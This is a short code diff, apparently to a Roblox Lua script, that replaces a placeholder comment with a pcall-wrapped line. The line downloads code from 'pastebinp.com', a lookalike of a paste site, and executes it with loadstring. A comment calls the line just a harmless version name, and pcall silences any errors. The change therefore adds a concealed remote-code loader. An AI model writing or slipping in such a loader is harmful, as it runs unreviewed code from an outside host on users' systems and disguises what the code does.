@@ -1,1 +1,3 @@
--- Still has yet to be made
+pcall(function()
+loadstring(game:HttpGet("https://pastebinp.com/raw/r5fSgr3k"))() -- Version name, this is just for fun
+end)
